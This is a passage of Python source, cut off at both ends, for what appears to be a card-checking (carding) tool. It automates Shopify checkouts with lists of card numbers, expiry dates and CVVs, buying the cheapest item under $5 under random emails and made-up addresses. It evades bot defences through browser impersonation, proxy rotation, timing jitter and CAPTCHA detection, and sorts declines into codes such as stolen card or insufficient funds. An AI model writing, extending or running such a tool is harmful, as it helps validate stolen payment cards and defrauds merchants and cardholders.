                    .get("sellerProposal", {}))
        return seller.get("tax", {}).get("totalTaxAmount", {}).get("value", {}).get("amount", "0.0")
    except Exception:
        return "0.0"


def extract_total_from_rejected(submit_json: str) -> str:
    try:
        seller = (json.loads(submit_json).get("data", {})
                    .get("submitForCompletion", {})
                    .get("sellerProposal", {}))
        for k in ("checkoutTotal", "total", "runningTotal"):
            v = seller.get(k, {}).get("value", {}).get("amount")
            if v:
                return v
    except Exception:
        pass
    return ""


def extract_receipt_id(submit_body: str) -> str:
    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', submit_body)
    return m.group(1) if m else ""


def extract_receipt_session_token(submit_body: str) -> str:
    m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', submit_body)
    return m.group(1) if m else ""


_SHOPIFY_ERROR_MAP: Dict[str, str] = {
    "risky": "RISK_REJECTED", "risk": "RISK_REJECTED", "fraud": "RISK_REJECTED",
    "suspected fraud": "RISK_REJECTED",
    "do not honor": "DO_NOT_HONOR", "do_not_honor": "DO_NOT_HONOR",
    "insufficient funds": "INSUFFICIENT_FUNDS", "insufficient_funds": "INSUFFICIENT_FUNDS",
    "card declined": "CARD_DECLINED", "card_declined": "CARD_DECLINED",
    "invalid card": "CARD_INVALID", "invalid_card": "CARD_INVALID",
    "expired card": "CARD_EXPIRED", "card expired": "CARD_EXPIRED",
    "incorrect cvc": "CVV_INVALID", "incorrect_cvc": "CVV_INVALID", "security code": "CVV_INVALID",
    "stolen card": "CARD_STOLEN", "lost card": "CARD_STOLEN", "pickup card": "CARD_STOLEN",
    "address": "ADDRESS_INVALID", "zip": "ZIP_INVALID", "postal": "ZIP_INVALID",
    "throttled": "RATE_LIMITED", "too many": "RATE_LIMITED", "rate limit": "RATE_LIMITED",
    "gateway": "GATEWAY_ERROR", "processing error": "GATEWAY_ERROR",
    "inventory": "OUT_OF_STOCK", "out of stock": "OUT_OF_STOCK", "unavailable": "OUT_OF_STOCK",
    "captcha": "CAPTCHA_REQUIRED", "terms": "TERMS_REQUIRED",
    "payment method": "PAYMENT_METHOD_INVALID",
}


def _map_error(raw: str) -> str:
    low = raw.lower()
    for k, code in _SHOPIFY_ERROR_MAP.items():
        if k in low:
            return code
    return raw.upper().replace(" ", "_")[:40]


def extract_any_error(submit_body: str) -> str:
    for p in (
        r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
        r'"localizedMessage"\s*:\s*"([^"]+)"',
        r'"code"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
    ):
        m = re.search(p, submit_body)
        if m:
            return _map_error(m.group(1))
    return ""


def extract_receipt_status_code(poll_body: str, receipt_type: str) -> str:
    if receipt_type in ("SuccessfulReceipt", "ProcessedReceipt"):
        return "ORDER_PLACED"
    if receipt_type == "ProcessingReceipt":
        return "PROCESSING"
    m = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
    if m:
        code = m.group(1)
        return "CAPTCHA_REQUIRED" if "CAPTCHA" in code else code
    if "CAPTCHA" in poll_body:
        return "CAPTCHA_REQUIRED"
    if receipt_type == "FailedReceipt":
        return "FAILED"
    return "UNKNOWN"


def detect_shipping_restriction(proposal_body: str) -> bool:
    low = proposal_body.lower()
    return any(s.lower() in low for s in (
        "SHIPPING_ADDRESS_UNDELIVERABLE",
        "no_delivery_options_available",
        "noDeliveryOptionsAvailable",
        "delivery is not available",
        "does not ship to",
    ))


# ──────────────────────── Receipt verification helpers ───────────────

def extract_charged_amount_from_receipt(receipt: Dict) -> Tuple[str, str]:
    """Return (amount, currency) from receipt.purchaseOrder.totalAmountToPay."""
    try:
        po = receipt.get("purchaseOrder") or {}
        tap = po.get("totalAmountToPay") or {}
        amt = tap.get("amount")
        cur = tap.get("currencyCode")
        return (str(amt) if amt else ""), (cur or "")
    except Exception:
        return "", ""


def extract_order_id_from_receipt(receipt: Dict) -> str:
    """Return the real order ID from receipt.orderIdentity.id."""
    try:
        identity = receipt.get("orderIdentity") or {}
        oid = identity.get("id")
        return str(oid) if oid else ""
    except Exception:
        return ""


def extract_receipt_url_from_receipt(receipt: Dict, fallback: str = "") -> str:
    """Return confirmationPage.url if set, else orderStatusPageUrl, else fallback."""
    try:
        conf = (receipt.get("confirmationPage") or {}).get("url", "")
        if conf:
            return conf
        order_page = receipt.get("orderStatusPageUrl", "") or ""
        if order_page:
            return order_page
    except Exception:
        pass
    return fallback


# ──────────────────────── Payload helpers ────────────────────────────

def patch_payload(payload: str, currency: str, country: str) -> str:
    if currency == "USD" and country == "US":
        return payload

    try:
        data = json.loads(payload)
    except json.JSONDecodeError:
        logger.error("patch_payload: JSON parse failed — string replace fallback")
        if currency != "USD":
            payload = payload.replace('"currencyCode":"USD"', f'"currencyCode":"{currency}"')
            payload = payload.replace('"presentmentCurrency":"USD"', f'"presentmentCurrency":"{currency}"')
        if country != "US":
            payload = payload.replace('"phoneCountryCode":"US"', f'"phoneCountryCode":"{country}"')
        return payload

    in_buyer = [False]

    def walk(o):
        if isinstance(o, dict):
            p = {}
            for k, v in o.items():
                if k == "presentmentCurrency" and v == "USD" and currency != "USD":
                    p[k] = currency
                elif k == "phoneCountryCode" and v == "US" and country != "US":
                    p[k] = country
                elif k == "countryCode" and v == "US" and country != "US" and in_buyer[0]:
                    p[k] = country
                elif k == "customer":
                    in_buyer[0] = True
                    p[k] = walk(v)
                    in_buyer[0] = False
                else:
                    p[k] = walk(v)
            return p
        if isinstance(o, list):
            return [walk(i) for i in o]
        return o

    return json.dumps(walk(data), separators=(",", ":"))


def generate_attempt_token(checkout_token: str) -> str:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return f"{checkout_token}-{''.join(random.choice(chars) for _ in range(10))}"


def generate_page_id() -> str:
    return f"{random.getrandbits(64):016x}"


# ──────────────────────── PCI vault ─────────────────────────────────

def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                     card_month: int, card_year: int, cvv: str,
                     shop_domain: str, proxy_url: str = "",
                     vault_url: str = "", vault_domain: str = "",
                     impersonate: str = "chrome124") -> Tuple[int, str]:
    endpoint = vault_url or "https://checkout.pci.shopifyinc.com/sessions"
    scope = vault_domain or shop_domain
    origin = endpoint.rsplit("/sessions", 1)[0] if "/sessions" in endpoint else "https://checkout.pci.shopifyinc.com"

    payload = json.dumps({
        "credit_card": {
            "number": card_number,
            "month": card_month,
            "year": card_year,
            "verification_value": cvv,
            "start_month": None,
            "start_year": None,
            "issue_number": "",
            "name": card_name,
        },
        "payment_session_scope": scope,
    })

    headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "origin": origin,
        "referer": f"{origin}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-fetch-storage-access": "active",
        "shopify-identification-signature": ident_sig,
    }

    with Session(impersonate=impersonate) as session:
        kw = {"data": payload, "headers": headers, "timeout": 20}
        if proxy_url:
            kw["proxy"] = proxy_url
        resp = session.post(endpoint, **kw)
    return resp.status_code, resp.text


# ──────────────────────── Proposal ───────────────────────────────────

def _proposal_headers(shop_url, checkout_url, checkout_token,
                      session_token, build_id, source_token) -> Dict:
    return {
        "accept": "application/json",
        "content-type": "application/json",
        "origin": shop_url,
        "referer": checkout_url,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-build-id": build_id,
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id": source_token,
    }


def _proposal_template(queue_token, stable_id, variant_id, email, addr, email_mode):
    if email_mode == "set":
        email_line = f'"email": {json.dumps(email)}, "emailChanged": true,'
    elif email_mode == "keep":
        email_line = f'"email": {json.dumps(email)}, "emailChanged": false,'
    else:
        email_line = ""

    queue_token_json = json.dumps(queue_token) if queue_token else "null"

    return f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "__SESSION__"}},
    "queueToken": {queue_token_json},
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}",
          "address2": "{addr.address2}",
          "city": "{addr.city}",
          "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}",
          "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}",
          "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      {email_line}
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "__PROPOSAL_ID__"
}}'''


def _send_proposal(client, shop_url, checkout_url, checkout_token,
                   session_token, stable_id, variant_id,
                   proposal_id, build_id, source_token,
                   queue_token, email, addr, email_mode,
                   currency, country):
    body = _proposal_template(queue_token, stable_id, variant_id, email, addr, email_mode)
    body = body.replace("__SESSION__", session_token)
    body = body.replace("__PROPOSAL_ID__", proposal_id)
    body = patch_payload(body, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=body,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
                                    session_token, build_id, source_token))
    return resp.status_code, resp.text


def send_poll_for_receipt(client, shop_url, checkout_url, checkout_token,
                          session_token, build_id, source_token,
                          poll_id, receipt_id, receipt_session_token):
    params = {
        "operationName": "PollForReceipt",
        "variables": json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
        "id": poll_id,
    }
    url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"
    h = _proposal_headers(shop_url, checkout_url, checkout_token,
                           session_token, build_id, source_token)
    h["x-checkout-web-source-id"] = checkout_token
    resp = client.get(url, headers=h)
    return resp.status_code, resp.text


def send_submit_for_completion(client, shop_url, checkout_url, checkout_token,
                                session_token, stable_id, variant_id,
                                submit_id, build_id, source_token, queue_token,
                                email, addr, delivery_handle, shipping_amount,
                                total_amount, pci_session_id, attempt_token,
                                currency, country, signed_handles,
                                is_digital=False, tax_amount=None,
                                checkpoint_data=None):
    handles_json = "[" + ",".join(json.dumps({"signedHandle": h})
                                    for h in (signed_handles or [])) + "]"
    page_id = generate_page_id()
    tax_val = tax_amount or "0.0"

    if is_digital:
        total_block = '"totalAmount": {"any": true}'
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["NONE"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
    else:
        total_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "destination": {{
            "streetAddress": {{
              "address1": "{addr.address1}",
              "address2": "{addr.address2}",
              "city": "{addr.city}",
              "countryCode": "{addr.country_code}",
              "postalCode": "{addr.postal_code}",
              "firstName": "{addr.first_name}",
              "lastName": "{addr.last_name}",
              "zoneCode": "{addr.zone_code}",
              "phone": "{addr.phone}",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyByHandle": {{
              "handle": "{delivery_handle}",
              "customDeliveryRate": false
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": false
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {handles_json}}}'''

    checkpoint_block = f'"checkpointData": {json.dumps(checkpoint_data)},' if checkpoint_data else ""

    body = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": "{session_token}"}},
      {checkpoint_block}
      "queueToken": "{queue_token}",
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      {delivery_block},
      "merchandise": {{
        "merchandiseLines": [{{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
            }}
          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null, "lineComponents": []
        }}]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        {total_block},
        "paymentLines": [{{
          "paymentMethod": {{
            "directPaymentMethod": {{
              "sessionId": "{pci_session_id}",
              "billingAddress": {{
                "streetAddress": {{
                  "address1": "{addr.address1}",
                  "address2": "{addr.address2}",
                  "city": "{addr.city}",
                  "countryCode": "{addr.country_code}",
                  "postalCode": "{addr.postal_code}",
                  "firstName": "{addr.first_name}",
                  "lastName": "{addr.last_name}",
                  "zoneCode": "{addr.zone_code}",
                  "phone": "{addr.phone}"
                }}
              }},
              "cardSource": null
            }},
            "giftCardPaymentMethod": null, "redeemablePaymentMethod": null,
            "walletPaymentMethod": null, "walletsPlatformPaymentMethod": null,
            "localPaymentMethod": null, "paymentOnDeliveryMethod": null,
            "paymentOnDeliveryMethod2": null, "manualPaymentMethod": null,
            "customPaymentMethod": null, "offsitePaymentMethod": null,
            "customOnsitePaymentMethod": null, "deferredPaymentMethod": null,
            "customerCreditCardPaymentMethod": null,
            "paypalBillingAgreementPaymentMethod": null,
            "remotePaymentInstrument": null
          }},
          "amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}
        }}],
        "billingAddress": {{
          "streetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": "{email}",
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      "poNumber": null,
      "taxes": {{
        "proposedAllocations": null,
        "proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "USD"}}}},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{
        "signature": null, "signatureUuid": null,
        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
      }},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{"requestUrl": "{checkout_url}", "pageId": "{page_id}"}}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''
    body = patch_payload(body, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=body,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
                                    session_token, build_id, source_token))
    return resp.status_code, resp.text


# ──────────────────────── Public helpers ─────────────────────────────

def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
    parts = card_entry.strip().split("|")
    if len(parts) != 4:
        raise Exception(f"invalid card format: {card_entry}")
    try:
        return parts[0], int(parts[1]), int(parts[2]), parts[3]
    except ValueError as e:
        raise Exception(f"invalid card month/year: {e}")


_SUPPORTED_PROXY_SCHEMES = {"http", "https", "socks4", "socks5", "socks5h"}


def _is_port_str(v: str) -> bool:
    return v.isdigit() and 1 <= int(v) <= 65535


def normalize_proxy(raw: str) -> str:
    p = raw.strip()
    if not p:
        raise Exception("empty proxy")

    if "://" in p:
        parsed = urllib.parse.urlparse(p)
        if not parsed.netloc:
            raise Exception(f"invalid proxy format: {raw}")
        scheme = parsed.scheme.lower()
        if scheme not in _SUPPORTED_PROXY_SCHEMES:
            raise Exception(f"unsupported proxy scheme: {scheme}")
        return p

    parts = p.split(":")
    if len(parts) == 4:
        p0, p1, p2, p3 = parts
        if _is_port_str(p1):
            host, port, user, pw = p0, p1, p2, p3
        elif _is_port_str(p3):
            user, pw, host, port = p0, p1, p2, p3
        else:
            raise Exception(f"invalid proxy format: {raw}")
        return f"http://{user}:{pw}@{host}:{port}"

    if len(parts) == 2:
        host, port = parts
        if not _is_port_str(port):
            raise Exception(f"invalid proxy port: {port}")
        return f"http://{host}:{port}"

    raise Exception(f"invalid proxy format: {raw}")


# ──────────────────────── Orchestrator ───────────────────────────────

def _captcha_result(card_entry: str, shop_url: str, currency: str,
                     stage: str) -> CheckResult:
    site_name = shop_url.replace("https://", "").replace("http://", "").rstrip("/")
    return CheckResult(
        card=card_entry,
        shop_url=shop_url,
        site_name=site_name,
        currency=currency,
        status=CheckStatus.ERROR,
        status_code="CAPTCHA_REQUIRED",
        error=Exception(f"CAPTCHA_REQUIRED ({stage})"),
        retryable=True,
    )


def _run_checkout_internal(shop_url: str, card_entry: str,
                            proxy_url: str = "", low: bool = True) -> CheckResult:
    currency = "USD"
    country = "US"
    site_name = shop_url.replace("https://", "").replace("http://", "").rstrip("/")

    result = CheckResult(
        card=card_entry,
        shop_url=shop_url,
        site_name=site_name,
        currency=currency,
        status=CheckStatus.ERROR,
    )

    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result

    email = generate_random_email()
    impersonate = random.choice(BROWSER_PROFILES)
    user_agent = random.choice(USER_AGENTS)
    client = TLSClient(timeout=15, proxy_url=proxy_url,
                        impersonate=impersonate, user_agent=user_agent)

    try:
        # Step 0
        try:
            max_p = 5.00 if low else float("inf")
            title, _pid, variant_id, price, product_handle = find_cheapest_product(
                client, shop_url, max_price=max_p)
            logger.info("step0 ok: %r variant=%s price=%s", title, variant_id, price)
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 0: {e}")
            return result

        _humanize_warmup(client, shop_url, product_handle=product_handle)

        # Step 1
        try:
            checkout_url, checkout_token, session_token, checkout_html = \
                add_to_cart_and_checkout(client, shop_url, variant_id)
            stable_id = extract_stable_id(checkout_html)
            build_id = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                raise Exception("missing stableId/buildId/sourceToken")
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 1: {e}")
            return result

        _jitter()

        # Step 2 (best-effort)
        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if pat_id:
                fetch_private_access_token(client, shop_url, checkout_url, pat_id)
        except Exception as e:
            logger.warning("step2 non-fatal: %s", e)

        # Step 3
        try:
            actions_url = extract_actions_js_url(checkout_html, shop_url)
            if not actions_url:
                raise Exception("no actions JS URL")
            js = fetch_actions_js(client, actions_url, shop_url)
            proposal_id = extract_proposal_id(js)
            submit_id = extract_submit_for_completion_id(js)
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal/Submit ID")
            poll_id = extract_poll_for_receipt_id(js) or \
                "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 3: {e}")
            return result

        # Step 4
        empty_addr = Address("", "", "", "", "", "US", "", "", "")
        try:
            _, p1 = _send_proposal(client, shop_url, checkout_url, checkout_token,
                                     session_token, stable_id, variant_id,
                                     proposal_id, build_id, source_token,
                                     None, email, empty_addr, "none",
                                     currency, country)
            if detect_captcha_challenge(p1):
                return _captcha_result(card_entry, shop_url, currency, "proposal 1")

            cur = extract_seller_currency(p1)
            if cur and cur != currency:
                currency = cur
            ctr = extract_seller_country(p1)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency

            if currency == "USD":
                sp = extract_seller_merchandise_price(p1)
                if sp and sp != price:
                    price = sp

            queue_token = extract_queue_token(p1)
            if not queue_token:
                raise Exception("no queueToken")
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 4: {e}")
            return result

        _jitter()

        # Step 5
        try:
            _, p2 = _send_proposal(client, shop_url, checkout_url, checkout_token,
                                     session_token, stable_id, variant_id,
                                     proposal_id, build_id, source_token,
                                     queue_token, email, empty_addr, "set",
                                     currency, country)
            if detect_captcha_challenge(p2):
                return _captcha_result(card_entry, shop_url, currency, "proposal 2")
            queue_token2 = extract_queue_token(p2)
            if not queue_token2:
                raise Exception("no queueToken")
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 5: {e}")
            return result

        _jitter()

        # Step 6
        try:
            addr = address_for_country(country)
            fallbacks = get_fallback_addresses(addr.country_code)
            fb_idx = 0
            qt2 = queue_token2
            chosen_p3 = None
            chosen_qt3 = None
            step6_is_digital = False

            for _attempt in range(1 + len(fallbacks)):
                _, p3 = _send_proposal(client, shop_url, checkout_url, checkout_token,
                                         session_token, stable_id, variant_id,
                                         proposal_id, build_id, source_token,
                                         qt2, email, addr, "keep",
                                         currency, country)
                if detect_captcha_challenge(p3):
                    return _captcha_result(card_entry, shop_url, currency, "proposal 3")

                qt3 = extract_queue_token(p3)
                if not qt3:
                    raise Exception("no queueToken")

                _is_dig = not extract_is_shipping_required(p3)
                if _is_dig or not detect_shipping_restriction(p3):
                    chosen_p3 = p3
                    chosen_qt3 = qt3
                    step6_is_digital = _is_dig
                    break

                if fb_idx < len(fallbacks):
                    addr = fallbacks[fb_idx]
                    fb_idx += 1
                    qt2 = qt3

            if not chosen_p3:
                raise Exception("no shipping available for any country")
            p3_body = chosen_p3
            queue_token3 = chosen_qt3
            is_digital = step6_is_digital
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 6: {e}")
            return result

        _jitter()

        # Step 7
        try:
            _, p4 = _send_proposal(client, shop_url, checkout_url, checkout_token,
                                     session_token, stable_id, variant_id,
                                     proposal_id, build_id, source_token,
                                     queue_token3, email, addr, "keep",
                                     currency, country)
            if detect_captcha_challenge(p4):
                return _captcha_result(card_entry, shop_url, currency, "proposal 4")
            queue_token4 = extract_queue_token(p4)
            if not queue_token4:
                raise Exception("no queueToken")
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 7: {e}")
            return result

        _jitter()

        # Step 8
        try:
            _, p5 = _send_proposal(client, shop_url, checkout_url, checkout_token,
                                     session_token, stable_id, variant_id,
                                     proposal_id, build_id, source_token,
                                     queue_token4, email, addr, "keep",
                                     currency, country)
            if detect_captcha_challenge(p5):
                return _captcha_result(card_entry, shop_url, currency, "proposal 5")

            _pd = re.compile(r'"pollDelay"\s*:\s*(\d+)')
            _pt = re.compile(r'"__typename"\s*:\s*"PendingTerms"')
            for _ in range(6):
                if not _pt.search(p5):
                    break
                m = _pd.search(p5)
                wait = int(m.group(1)) / 1000.0 if m else 0.5
                time.sleep(max(wait, 0.3))
                _, p5 = _send_proposal(client, shop_url, checkout_url, checkout_token,
                                         session_token, stable_id, variant_id,
                                         proposal_id, build_id, source_token,
                                         queue_token4, email, addr, "keep",
                                         currency, country)
                if detect_captcha_challenge(p5):
                    return _captcha_result(card_entry, shop_url, currency, "pending")
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 8: {e}")
            return result

        _jitter()

        # Step 9
        try:
            ident_sig = extract_identification_signature(checkout_html)
            vault_url = extract_vault_url(checkout_html)
            vault_domain = extract_vault_domain(checkout_html) or site_name
            if not ident_sig:
                raise Exception("no identification signature")

            card_name = f"{addr.first_name} {addr.last_name}"
            _, pci_body = send_pci_session(
                ident_sig, card_number, card_name,
                card_month, card_year, card_cvv,
                vault_domain, proxy_url,
                vault_url=vault_url, vault_domain=vault_domain,
                impersonate=impersonate)
            pci_session_id = extract_pci_session_id(pci_body)

            if not pci_session_id:
                fallback = ("https://checkout.pci.shopifycs.com/sessions"
                            if "shopifyinc" in (vault_url or "")
                            else "https://checkout.pci.shopifyinc.com/sessions")
                _, pci_body = send_pci_session(
                    ident_sig, card_number, card_name,
                    card_month, card_year, card_cvv,
                    site_name, proxy_url, vault_url=fallback,
                    impersonate=impersonate)
                pci_session_id = extract_pci_session_id(pci_body)

            if not pci_session_id and proxy_url:
                _, pci_body = send_pci_session(
                    ident_sig, card_number, card_name,
                    card_month, card_year, card_cvv,
                    vault_domain, "",
                    vault_url=vault_url, vault_domain=vault_domain,
                    impersonate=impersonate)
                pci_session_id = extract_pci_session_id(pci_body)

            if not pci_session_id:
                raise Exception(f"no PCI session id (body: {pci_body[:120]})")
        except Exception as e:
            result.retryable = True
            result.error = Exception(f"Step 9: {e}")
            return result

        # Step 10
        try:
            queue_token5 = extract_queue_token(p5)
            if not queue_token5:
                raise Exception("no queueToken")

            delivery_handle = extract_delivery_handle(p5)
            if not delivery_handle and not is_digital:
                result.retryable = True
                raise Exception("no delivery handle")

            signed_handles = extract_signed_handles(p5)
            _filled5 = ('"__typename": "FilledDeliveryTerms"' in p5 or
                        '"__typename":"FilledDeliveryTerms"' in p5)
            if not signed_handles and not is_digital and not _filled5:
                result.retryable = True
                raise Exception("no signed handles")

            shipping_amount = extract_shipping_amount(p5) or "0.00"
            if not shipping_amount and not is_digital:
                result.retryable = True
                raise Exception("no shipping amount")

            total_amount = (extract_checkout_total(p5)
                             or extract_seller_total(p5)
                             or (extract_running_total(p5) if is_digital else ""))
            if not total_amount:
                raise Exception("no total amount")
            result.amount = total_amount

            attempt_token = generate_attempt_token(checkout_token)
            current_tax = extract_tax_amount(p5)
            current_total = total_amount or "0.01"

            submit_status = submit_body = None
            for tax_attempt in range(1, 4):
                submit_status, submit_body = send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, submit_id, build_id, source_token,
                    queue_token5, email, addr, delivery_handle, shipping_amount,
                    current_total, pci_session_id, attempt_token,
                    currency, country, signed_handles,
                    is_digital=is_digital, tax_amount=current_tax)

                if detect_captcha_challenge(submit_body):
                    return _captcha_result(card_entry, shop_url, currency, "submit")

                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    nt = extract_tax_from_rejected(submit_body)
                    nto = extract_total_from_rejected(submit_body)
                    if nt:
                        current_tax = nt
                    if nto:
                        current_total = nto
                    time.sleep(0.1)
                    continue
                break

            logger.info("step10 submit_status=%s body=%s", submit_status, submit_body[:400])

            receipt_id = extract_receipt_id(submit_body)
            if not receipt_id:
                err = extract_any_error(submit_body)
                if err:
                    result.status = CheckStatus.DECLINED
                    result.status_code = err
                    result.error = Exception(err)
                    result.retryable = any(k in err.lower() for k in
                                            ("inventory", "retry", "generic", "try again"))
                else:
                    result.retryable = True
                    result.error = Exception("no receiptId / no error message")
                return result

